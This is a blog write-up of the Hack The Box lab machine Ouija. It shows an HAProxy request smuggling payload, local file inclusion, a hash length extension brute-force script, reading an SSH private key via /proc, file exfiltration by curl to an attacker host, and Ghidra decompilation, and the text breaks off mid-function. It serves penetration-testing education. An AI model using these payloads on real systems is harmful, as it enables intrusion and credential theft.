---
title: "HTB Ouija Writeup"
date: 2024-05-18 00:30:00
categories: HTB Machine
tags: Source_code_analysis request_smuggling reverse_engineering
---

![Ouija](/assets/img/Ouija/GAMn1WHWAAAEXop.png)

## Introduction

This box was initially rated hard but after seeing the low amount of people solving it, and how difficult it actually was, Hack The Box decided to rate this one insane instead. The initial access was not the easiest to exploit, but quite doable with all the hints the box creator gives along the way. The real difficulty laid in the exploitation of root. To get root access you would need to reverse engineer a library used in an application running as root. This library had a vulnerability allowing you to overwrite the memory of other variables by adjusting one. This was one of the most interesting boxes I've done up to this date.

If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.

## Initial access

### Recon

To start our recon off we will start with an Nmap scan of the machine. Using the following command:

```
sudo nmap -sS -A -p-  -o nmap  10.10.11.244
```

**Nmap**

```
# Nmap 7.94 scan initiated Mon Dec  4 14:27:39 2023 as: nmap -sS -A -p- -o nmap 10.10.11.244
Nmap scan report for 10.10.11.244
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 6f:f2:b4:ed:1a:91:8d:6e:c9:10:51:71:d5:7c:49:bb (ECDSA)
|_  256 df:dd:bc:dc:57:0d:98:af:0f:88:2f:73:33:48:62:e8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/4%OT=22%CT=1%CU=37102%PV=Y%DS=2%DC=T%G=Y%TM=656E285
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   25.89 ms 10.10.14.1
2   26.00 ms 10.10.11.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  4 14:28:29 2023 -- 1 IP address (1 host up) scanned in 50.52 seconds
```

Looking at the output, there are two interesting open ports, **80** and **3000**. During the first enumeration I could see that **port 3000** gave a 200 response each time, saying it didn't find any file so at this moment I left it be. Next up I browsed to the http port and would get a default apache page.

![Default webpage](/assets/img/Ouija/Ouija_01.png)

When running gobuster to get an idea of what was running on this port I discovered that the **server-status** page was accessible. This page is often a treasure trove of information

![Gobuster](/assets/img/Ouija/Ouija_02.png)

When browsing to the page I could see that there were some vhosts being used. Furthermore, we can see that the client is redirecting to port 8080 which gives me the impression that a reverse proxy is being used. We could see **Ouija.htb** was being used here.

![Status_page](/assets/img/Ouija/Ouija_03.png)

As part of the enumeration process I searched for vhosts and saw a few interesting things after running the following list.

```bash
sudo wfuzz -c -f sub-fighter -Z -w /home/kali/share/Share/Tools/general/SecLists/Discovery/DNS/n0kovo_subdomains.txt -u http://ouija.htb -H "Host: FUZZ.ouija.htb"  --hl 363 -t 200

```

Every name that contained dev was automatically turned into 403 unauthorized. This looked odd to me. Additionally gitea was found to be a valid domain. This domain could also be found in the tracking script on the homepage of the ouija web page.

```
Target: http://ouija.htb/
Total requests: 3000000
==================================================================
ID    Response   Lines      Word         Chars          Request
==================================================================
00011:  C=403      3 L	       8 W	     93 Ch	  "dev"
00090:  C=403      3 L	       8 W	     93 Ch	  "developer"
00107:  C=403      3 L	       8 W	     93 Ch	  "development"
09767:  C=200    275 L	    1279 W	  13900 Ch	  "gitea"
09967:  C=403      3 L	       8 W	     93 Ch	  "devportal-test"
10105:  C=403      3 L	       8 W	     93 Ch	  "dev-business"
10073:  C=403      3 L	       8 W	     93 Ch	  "development-sfcc"
```

![Gitea tracker](/assets/img/Ouija/Ouija_04.png)

So next step is adding this vhost to our hosts file and check out this site. It was A Gitea service which is commonly used to store source code of applications or configurations of servers. This makes it a great target to go after.

![Gitea ](/assets/img/Ouija/Ouija_05.png)

After creating an account, no projects shared in the organization would pop up. I then decided to visit the url mentioned before in the tracking script. This lead me to the following repo.

```
http://gitea.ouija.htb/leila/ouija-htb/
```

This repo shows us everything used for the main application. It also discloses a username **leila**

![Repo ](/assets/img/Ouija/Ouija_06.png)

I was able to clone the git repo using the following command. Now we have the source code of the main web application.

```bash
git clone http://gitea.ouija.htb/leila/ouija-htb.git
```

Looking over the code, nothing was really that interesting on there. In the code itself, it basically was a static website. The readme, however did include some interesting information. It included which versions of software needed to be installed for this application to work.

```
## Ouija website setup & Product information
id: 1

owner: Ouija

third-party appliances:
  - haproxy
  - apache2
type: company
platform:
  - linux
  - php
release_date: 6/21/23

## Instructions
* Install PHP8.2
* Install Apache version 2.4.52
* Install HA-Proxy version 2.2.16
* Use the 000-default.conf pointing to /var/www/html
* Fork and clone repository to /var/www/html
* Configure HA-Proxy
* Start the PHP service
* Start the Apache service
* Enjoy your website!
```

### Request Smuggling

Looking at the versions I noticed that HA proxy has a very interesting publicly known vulnerability. Namely [CVE-2023-25725](https://nvd.nist.gov/vuln/detail/CVE-2023-25725). It took quite a lot of reading up and trial and error on how to exploit this. Instead of writing a copyable request response I'll take screenshots of burp including the **\r \n** characters since its important to have these right. To exploit this we need to cause an overflow in the content header while at the same time trying access something differently. In the end at this point we are looking if can make the server return two responses.

To figure out how many characters we need to overflow this service I used burpsuite's intruder functionality.

![Burp request](/assets/img/Ouija/Ouija_07.png)

Setting up the payload to brute keep adding a letter **a** to the content-length. Around 251 a's we start seeing errors of the second request, this is a sign that the HA proxy is starting to smuggle payloads in. We could see that this was the case because at the bottom of the first request the second request values would be appended.

![Burp settings](/assets/img/Ouija/Ouija_08.png)

![Error triggered](/assets/img/Ouija/Ouija_09.png)

So after playing around with it for a bit more I found the sweetspot being **255** characters. Now the next part of making this exploit work is getting the content length right. If this isn't right then the request will fail and be seen as a bad request. Counting up all the characters that would be counted within the content length I came to the conclusion that when you want to try and enumerate files on the `dev.ouija.htb` domain you end up with **40** characters plus the amount of characters your file has. Seeing that I wanted to grab **index.php** this means I need to add 9 characters resulting on a content length of 49.

```
POST /index.html HTTP/1.1

Host: ouija.htb

Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:

Content-Length: 49





GET http://dev.ouija.htb/index.php HTTP/1.1

x:Get / HTTP/1.1

Host: ouija.htb




```

![Successfull smuggling](/assets/img/Ouija/Ouija_10.png)

The index.php file would look like this.

```
<body>
    <h1>projects under development</h1>
    <ul>
        <li>
            <strong>Project Name:</strong> Api
            <br>
            <strong>Api Source Code:</strong> <a href="http://dev.ouija.htb/editor.php?file=app.js" target="_blank">app.js</a>
            <strong>Init File:</strong> <a href="http://dev.ouija.htb/editor.php?file=init.sh" target="_blank">init.sh</a>
        </li>
    </ul>
    <footer>
        &copy; 2023 ouija software
    </footer>
</body>
```

This gave us the following two url that grab some files. lets start retrieving these files.

```
http://dev.ouija.htb/editor.php?file=app.js
http://dev.ouija.htb/editor.php?file=init.sh
```

![Extracting App.js](/assets/img/Ouija/Ouija_11.png)
![Extracting init.sh](/assets/img/Ouija/Ouija_12.png)

This function was also vulnerable to local file inclusion since I was able to extract **/etc/passwd** as well using the following url:

```
http://dev.ouija.htb/editor.php?file=/../../../../etc/passwd
```

![Extracting passwd](/assets/img/Ouija/Ouija_13.png)

### Exploiting the api

#### Source code analysis

So the source code we found matches the application used on port **3000**. So lets analyze the source code. There are 6 API endpoints found in the app.js file. If you want to read the full app.js file please refer to the bottom of the write up.

##### Login endpoint

The login endpoint looks like a bogus function. In the end its looking if uname or upass are set. No matter what you do it will give you a disabled message. This function is clearly not interesting to us.

```js
app.get("/login", (q, r, n) => {
  if (!q.query.uname || !q.query.upass) {
    r.json({ message: "uname and upass are required" });
  } else {
    if (!q.query.uname || !q.query.upass) {
      r.json({ message: "uname && upass are required" });
    } else {
      r.json({ message: "disabled (under dev)" });
    }
  }
});
```

##### Register

This function is also a bogus funtion no matter what you send to it it will always give back **disabled**

```js
app.get("/register", (q, r, n) => {
  r.json({ message: "__disabled__" });
});
```

##### Users

The users function doesn't give any data however it does validate if your authentication is valid. This might come in handy later on.

```js
app.get("/users", (q, r, n) => {
  ensure_auth(q, r);
  r.json({ message: "Database unavailable" });
});
```

##### file/get

This function looks very interesting, but it requires us to have valid authentication. This function seems to be able to retrieve files so depending if we can find a payload that doesn't use .. or ../ we could gain access to arbitrary files.

```js
app.get("/file/get", (q, r, n) => {
  ensure_auth(q, r);
  if (!q.query.file) {
    r.json({ message: "?file= i required" });
  } else {
    let file = q.query.file;
    if (file.startsWith("/") || file.includes("..") || file.includes("../")) {
      r.json({ message: "Action not allowed" });
    } else {
      fs.readFile(file, "utf8", (e, d) => {
        if (e) {
          r.json({ message: e });
        } else {
          r.json({ message: d });
        }
      });
    }
  }
});
```

##### /file/upload

The file upload functionality is again a bogus function. It will always returnd **disabled**

```js
app.get("/file/upload", (q, r, n) => {
  r.json({ message: "Disabled for security reasons" });
});
```

##### Authentication

So seeing that we don't have a way to create our own user I decided to take a closer look at the authtentication functions the first function **ensure_auth** checks if I'm using proper headers as authentication. Further we can see that the identification header must have the value "**::admin:True** in it. For the rest it doesn't really care what is in it. In the code we can also see the **Verify_cookies** function does extra verification steps, so let's look at that function next.

```js
function ensure_auth(q, r) {
  if (!q.headers["ihash"]) {
    r.json("ihash header is missing");
  } else if (!q.headers["identification"]) {
    r.json("identification header is missing");
  }

  if (verify_cookies(q.headers["identification"], q.headers["ihash"]) != 0) {
    r.json("Invalid Token");
  } else if (!d(q.headers["identification"]).includes("::admin:True")) {
    r.json("Insufficient Privileges");
  }
}
```

Looking at this function we can see that it uses the **d** function before feeding it to the **generate_cookies** function. We'll have to dig deeper into these functions lets start with function **d**.

```js
function verify_cookies(identification, rhash) {
  if (generate_cookies(d(identification)) === rhash) {
    return 0;
  } else {
    return 1;
  }
}
```

In the d function we could see that this basically base64 decodes the value of we feed it in our case the value of the **identification** header. Knowing this means that our header needs to be a base64 encoded value. Lets check out the **generate_cookies** function next.

```js
function d(b) {
  s1 = Buffer.from(b, "base64").toString("utf-8");
  s2 = Buffer.from(s1.toLowerCase(), "hex");
  return s2;
}
```

The next function basically generates the digest of the hash provided in **identification** header, which then gets returned and compared to the **ihash** header. This means that the digest must match the **ihash**.

```js
function generate_cookies(identification) {
  var sha256 = crt.createHash("sha256");
  wrap = sha256.update(key);
  wrap = sha256.update(identification);
  hash = sha256.digest("hex");
  return hash;
}
```

When looking back at the init.sh file I could see that there was information for a bot in there. This bot used the api key from a file that we don't have access to. But the interesting thing here is that there was already a hash value disclosed. **4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1** Knowing that this hash was created using **sha256**, it makes it possible to attempt a hash extention attack.

```sh
#!/bin/bash

echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1
```

An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

We could then use the [hash_extender](https://github.com/iagox86/hash_extender). Using this tool we can brute force the secret used and generate a bunch of hashes with our extra data added to it. My goal was to add the data **::admin:True** to the already existing hash. We could do this by running the following command using hash_extender. Using the **--secret-min=1** and **--secret-max 64** parameters, I bruteforced the entire block range of sha256.

```
./hash_extender -d 'bot1:bot' -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -a '::admin:True' -f sha256 --secret-min=1 --secret-max 64 > hashes_collection.txt
```

After running this command we're left with a text file full of hashes. Unfortunately this tool also created output we weren't interested in. I wrote the following python script to clean up the output data and automatically test the valid values. In the end its a fairly easy script. The first part is just opening the text file we created and stripping out any bad characters as well as creating a pair of **key** and **string**. After we had these pairs, I created the right headers. The signature I put into the **ihash** header. The **identification** header was given the base64 and utf-8 encoded value of the sha256 string. The encoding was necessary since we could see in the source code it would base64 decode it before use. Then it would keep sending these requests until one returned without the text **invalid token**.

```python
import requests
import base64

with open('hashes_collection.txt') as f:
    lines = f.readlines()
objectlist=[]
object={"sig":"","string":""}
for line in lines:
    if "New signature" in line:
        object["sig"]=line.split(":")[1].strip("")
    if "New string:" in line:
        object["string"]=line.split(":")[1].strip("")

    if object["sig"] != "" and object["string"] != "":
        objectlist.append(object)
        object={"sig":"","string":""}

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

url = 'http://ouija.htb:3000/users'

for x in objectlist:
    headers = {
       'identification': base64.b64encode(x["string"].strip().encode('utf-8')),
       'ihash': x["sig"].strip(),
    }
    response = requests.get(url, proxies=proxies,headers=headers)
    if "Invalid Token" not in response.text:
        print("VALID HEADERS FOUND!")
        print(headers)
        break
```

![Headers found](/assets/img/Ouija/Ouija_14.png)

When we send a request with these headers we would get a valid response from the users endpoint.

```
GET /users HTTP/1.1
Host: ouija.htb:3000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
```

The server then issued the following valid response showing our headers were indeed valid.

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 34
ETag: W/"22-7EAEclfgg9q4ZBOBc2bfWPvYc5Q"
Date: Wed, 06 Dec 2023 22:45:56 GMT
Connection: close

{"message":"Database unavailable"}
```

So now that we have valid tokens we can start using the rest of the API's. The only interesting API was the **/file/get** endpoint as this would allow us to read files. This however, had a bit of a difficulty since it had some security measures in place to avoid going up in the directories. It took me a while to figure out, but when I looked at the init.sh file again I saw this **soft link command**. Making a soft link to proc basically means we can reach all the values that are contained within the process memory.

```bash
ln -s /proc .config/bin/process_informations
```

My first request to try out the validity of this link was to check the environment variables running this process. Normally this can be found in **/proc/self/environ**. In our case we would subtitute proc with **.config/bin/process_informations/**. Send the following request to get access to the environement variables.

```
GET /file/get?file=.config/bin/process_informations/self/environ HTTP/1.1
Host: ouija.htb:3000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
```

The server would then send us the environment variables. In these variables we can see that the user running this process was named **leila**

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 322
ETag: W/"142-+Y/KGuT3S/I9PQmGs+z7CpSdnvI"
Date: Wed, 06 Dec 2023 22:51:28 GMT
Connection: close

{"message":"LANG=en_US.UTF-8\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000HOME=/home/leila\u0000LOGNAME=leila\u0000USER=leila\u0000SHELL=/bin/bash\u0000INVOCATION_ID=0051960ef5cc416d9cc2c20873e2399d\u0000JOURNAL_STREAM=8:20911\u0000SYSTEMD_EXEC_PID=853\u0000k=FKJS645GL41534DSKJ@@GBD\u0000"}
```

Knowing there was a called **leila** I decided to check if there was an ssh key present for this user. I was able to obtain the private key using the following request.

```
GET /file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa HTTP/1.1
Host: ouija.htb:3000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
```

The server then issued the following response giving us the sshkey.

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 2642
ETag: W/"a52-bAtz6tOH+CzpQMnhN396ep+4koE"
Date: Wed, 06 Dec 2023 22:57:25 GMT
Connection: close

{"message":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAqdhNH4Q8tqf8bXamRpLkKKsPSgaVR1CzNR/P2WtdVz0Fsm5bAusP\nO4ef498wXZ4l17LQ0ZCwzVj7nPEp9Ls3AdTFZP7aZXUgwpWF7UV7MXP3oNJ0fj26ISyhdJ\nZCTE/7Wie7lkk6iEtIa8O5eW2zrYDBZPHG0CWFk02NVWoGjoqpL0/kZ1tVtXhdVyd3Q0Tp\nmiaGjCSJV6u1jMo/uucsixAb+vYUrwlWaYsvgW6kmr26YXGZTShXRbqHBHtcDRv6EuarG5\n7SqKTvVD0hzSgMb7Ea4JABopTyLtQSioWsEzwz9CCkJZOvkU01tY/Vd1UJvDKB8TOU2PAi\naDKaZNpDNhgHcUSFH4/1AIi5UaOrX8NyNYBirwmDhGovN/J1fhvinXts9FlzHKZINcJ99b\nKkPln3e5EwJnWKrnTDzL9ykPt2IyVrYz9QmZuEXu7zdgGPxOd+HoE3l+Px9/pp32kanWwT\nyuv06aVlpYqm9PrHsfGdyfsZ5OMG3htVo4/OXFrBAAAFgE/tOjBP7TowAAAAB3NzaC1yc2\nEAAAGBAKnYTR+EPLan/G12pkaS5CirD0oGlUdQszUfz9lrXVc9BbJuWwLrDzuHn+PfMF2e\nJdey0NGQsM1Y+5zxKfS7NwHUxWT+2mV1IMKVhe1FezFz96DSdH49uiEsoXSWQkxP+1onu5\nZJOohLSGvDuXlts62AwWTxxtAlhZNNjVVqBo6KqS9P5GdbVbV4XVcnd0NE6ZomhowkiVer\ntYzKP7rnLIsQG/r2FK8JVmmLL4FupJq9umFxmU0oV0W6hwR7XA0b+hLmqxue0qik71Q9Ic\n0oDG+xGuCQAaKU8i7UEoqFrBM8M/QgpCWTr5FNNbWP1XdVCbwygfEzlNjwImgymmTaQzYY\nB3FEhR+P9QCIuVGjq1/DcjWAYq8Jg4RqLzfydX4b4p17bPRZcxymSDXCffWypD5Z93uRMC\nZ1iq50w8y/cpD7diMla2M/UJmbhF7u83YBj8Tnfh6BN5fj8ff6ad9pGp1sE8rr9OmlZaWK\npvT6x7Hxncn7GeTjBt4bVaOPzlxawQAAAAMBAAEAAAGAEJ9YvPLmNkIulE/+af3KUqibMH\nWAeqBNSa+5WeAGHJmeSx49zgVPUlYtsdGQHDl0Hq4jfb8Zbp980JlRr9/6vDUktIO0wCU8\ndY7IsrYQHoDpBVZTjF9iLgj+LDjgeDODuAkXdNfp4Jjtl45qQpYX9a0aQFThTlG9xvLaGD\nfuOFkdwcGh6vOnacFD8VmtdGn0KuAGXwTcZDYr6IGKxzIEy/9hnagj0hWp3V5/4b0AYxya\ndxr1E/YUxIBC4o9oLOhF4lpm0FvBVJQxLOG+lyEv6HYesX4txDBY7ep6H1Rz6R+fgVJPFx\n1LaYaNWAr7X4jlZfBhO5WIeuHW+yqba6j4z3qQGHaxj8c1+wOAANVMQcdHCTUvkKafh3oz\n4Cn58ZeMWq6vwk0vPdRknBn3lKwOYGrq2lp3DI2jslCh4aaehZ1Bf+/UuP6Fc4kbiCuNAR\ndM7lG35geafrfJPo9xfngr44I8XmhBCLgoFO4NfpBSjnKtNa2bY3Q3cQwKlzLpPvyBAAAA\nwErOledf+GklKdq8wBut0gNszHgny8rOb7mCIDkMHb3bboEQ6Wpi5M2rOTWnEO27oLyFi1\nhCAc+URcrZfU776hmswlYNDuchBWzNT2ruVuZvKHGP3K3/ezrPbnBaXhsqkadm2el5XauC\nMeaZmw/LK+0Prx/AkIys99Fh9nxxHcsuLxElgXjV+qKdukbT5/YZV/axD4KdUq0f8jWALy\nrym4F8nkKwVobEKdHoEmK/Z97Xf626zN7pOYx0gyA7jDh1WwAAAMEAw9wL4j0qE4OR5Vbl\njlvlotvaeNFFUxhy86xctEWqi3kYVuZc7nSEz1DqrIRIvh1Anxsm/4qr4+P9AZZhntFKCe\nDWc8INjuYNQV0zIj/t1mblQUpEKWCRvS0vlaRlZvX7ZjCWF/84RBr/0Lt3t4wQp44q1eR0\nnRMaqbOcnSmGhvwWaMEL73CDIvzbPK7pf2OxsrCRle4BvnEsHAG/qlkOtVSSerio7Jm7c0\nL45zK+AcLkg48rg6Mk52AzzDetpNd5AAAAwQDd/1HsP1iVjGut2El2IBYhcmG1OH+1VsZY\nUKjA1Xgq8Z74E4vjXptwPumf5u7jWt8cs3JqAYN7ilsA2WymP7b6v7Wy69XmXYWh5RPco3\nozaH3tatpblZ6YoYZI6Aqt9V8awM24ogLZCaD7J+zVMd6vkfSCVt1DHFdGRywLPr7tqx0b\nKsrdSY5mJ0d004Jk7FW+nIhxSTD3nHF4UmLtO7Ja9KBW9e7z+k+NHazAhIpqchwqIX3Io6\nDvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=\n-----END OPENSSH PRIVATE KEY-----\n"}
```

Now that we have this key we can log into the machine as leila's user using the following ssh command.

```sh
ssh -i id_rsa leila@ouija.htb
```

![User access](/assets/img/Ouija/Ouija_15.png)

## Privilege escalation

When landing on the box the most obvious ways to escalate privileges were not found, so I looked for services that might be running on localhost. Using **netstat -tunlp** I was able to see that there was a service running on localhost port **9999**

```bash
netstat -tunlp
```

![Ports open](/assets/img/Ouija/Ouija_16.png)

My next step was to try and verify if this was a web service. I did this by running the following command using curl on the machine

```bash
curl localhost:9999
```

This returned a web page showing that it indeed was a web service. Next up I installed an ssh socks proxy giving me access to the service from my own machine.

```
ssh -D 1080 leila@ouija.htb -i  id_rsa
```

Then after setting the socks proxy in burp we could access the application by just browsing to it

![Service reachable](/assets/img/Ouija/Ouija_17.png)

Next I started to search for which files might match this webservice. After looking around a little bit I found that the **index.php** at **/development/server-management_system_id_0** matched the file I saw through the proxy. The top of this file had the following php script block.

```php
<?php
	class info__index__wellcom{
		public static $__VERSION = 0;
		public static $__DEBUG = 1;
		public $__DESCRIPTION = "testing login";
		public static $__IS_ATTACHED_TO_SYS = 1;
		public static $__NAME = "WBMS root";
		public $__OWNER = "WBMS ouija";
		public $__PRODUCT_ID = 0;
		private static $__DBCREDS = "0:0@/0";
		private static $__PPD = "linux/php";
	}
?>
<?php
	if(info__index__wellcom::$__DEBUG){
		include '../utils/debug.php';
		init_debug();
	}
?>
<?php
	if(isset($_POST['username']) && isset($_POST['password'])){
//		system("echo ".$_POST['username']." > /tmp/LOG");
		if(say_lverifier($_POST['username'], $_POST['password'])){
			session_start();
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['IS_USER_'] = "yes";
			$_SESSION['__HASH__'] = md5($_POST['username'] . "::" . $_POST['password']);
			header('Location: /core/index.php');
		}else{
			echo "<script>alert('invalid credentials')</alert>";
		}
	}
?>
```

In the code block aboce we can see that it uses the **say_lverifier** function which is not a standard php function. This lead me to believe it might be a shared library. Because its being used in a PHP script it should be included somewhere among the other libraries. For this version of php they could be found at
**/usr/lib/php/20220829**

```
ls -hal
```

![Service Binary found](/assets/img/Ouija/Ouija_18.png)

Seeing that this shared library was a key part of this machine I decided to exfiltrate it using a python upload server. First setup the uploadserver using the following command:

```
python3 -m uploadserver 80
```

Next use the following curl command to upload the binary

```
curl -X POST http://10.10.14.216/upload -F files=@lverifier.so
```

#### Reverse engineering the libary

Now that we have the shared libary on our machine we have to start analyzing it. I decided to do this using **Ghidra**. Open Gidra and start a new non shared project. Choose a project location and name, then import the file.

![Importing file](/assets/img/Ouija/Ouija_19.png)

The first function I encountered while reverse engineering the binary I could see that it tries to validate the two local paramaters. These were presumably the username and password. This function itself didn't really show much interesting stuff so we have to dig deeper into the **validating_userinput** function.

```c
void zif_say_lverifier(long param_1,long param_2)

{
  int iVar1;
  undefined8 local_28;
  undefined local_20 [8];
  undefined8 local_18;
  undefined local_10 [8];

  zend_parse_parameters
            (*(undefined4 *)(param_1 + 0x2c),&DAT_00102045,&local_28,local_20,&local_18,local_10);
  iVar1 = validating_userinput(local_28,local_18);
  *(uint *)(param_2 + 8) = (iVar1 == 1) + 2;
  return;
}
```

The user verification function doesn't look that interesting either, but at the end there is another function called **event_recorder**. Next step is to look deeper into this function.

```c

void validating_userinput(undefined8 *param_1,undefined8 param_2)

{
  long lVar1;
  size_t sVar2;
  long lVar3;
  ulong uVar4;
  ulong uVar5;
  undefined8 *puVar6;
  undefined8 *puVar7;
  byte bVar8;
  undefined8 uStack_680;
  undefined4 local_678;
  undefined4 uStack_674;
  undefined4 uStack_670;
  undefined4 uStack_66c;
  undefined8 local_668;
  undefined8 local_660;
  undefined local_658 [16];
  undefined local_648 [16];
  undefined local_638 [16];
  undefined local_628 [16];
  undefined4 local_618;
  undefined4 local_608;
  undefined4 uStack_604;
  undefined4 uStack_600;
  undefined4 uStack_5fc;
  undefined4 local_5f8;
  undefined4 uStack_5f4;
  undefined4 uStack_5f0;
  undefined4 uStack_5ec;
  undefined8 local_5e8;
  undefined8 uStack_5e0;
  undefined8 local_5d8 [79];
  undefined8 auStack_360 [102];
  undefined8 local_30;

  bVar8 = 0;
  uStack_680 = 0x10186d;
  sVar2 = strlen((char *)param_1);
  local_660 = 0;
  local_678._0_1_ = '/';
  local_678._1_1_ = 'v';
  local_678._2_1_ = 'a';
  local_678._3_1_ = 'r';
  uStack_674._0_1_ = '/';
  uStack_674._1_1_ = 'l';
  uStack_674._2_1_ = 'o';
  uStack_674._3_1_ = 'g';
  uStack_670._0_1_ = '/';
  uStack_670._1_1_ = 'l';
  uStack_670._2_1_ = 'v';
  uStack_670._3_1_ = 'e';
  uStack_66c._0_1_ = 'r';
  uStack_66c._1_1_ = 'i';
  uStack_66c._2_1_ = 'f';
  uStack_66c._3_1_ = 'i';
  local_658 = (undefined  [16])0x0;
  local_648 = (undefined  [16])0x0;
  lVar1 = -((long)(short)((short)sVar2 + 10) + 0xfU & 0xfffffffffffffff0);
  local_638 = (undefined  [16])0x0;
  puVar7 = local_5d8;
  for (lVar3 = 0x51; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + (ulong)bVar8 * -2 + 1;
  }
  local_628 = (undefined  [16])0x0;
  local_668 = 0x676f6c2e7265;
  puVar6 = auStack_360 + 3;
  local_608._0_1_ = 's';
  local_608._1_1_ = 'e';
  local_608._2_1_ = 's';
  local_608._3_1_ = 's';
  uStack_604._0_1_ = 'i';
  uStack_604._1_1_ = 'o';
  uStack_604._2_1_ = 'n';
  uStack_604._3_1_ = '=';
  uStack_600._0_1_ = '1';
  uStack_600._1_1_ = ':';
  uStack_600._2_1_ = 'u';
  uStack_600._3_1_ = 's';
  uStack_5fc._0_1_ = 'e';
  uStack_5fc._1_1_ = 'r';
  uStack_5fc._2_1_ = '=';
  uStack_5fc._3_1_ = 'r';
  local_618 = 0;
  local_5f8._0_1_ = 'o';
  local_5f8._1_1_ = 'o';
  local_5f8._2_1_ = 't';
  local_5f8._3_1_ = ':';
  uStack_5f4._0_1_ = 'v';
  uStack_5f4._1_1_ = 'e';
  uStack_5f4._2_1_ = 'r';
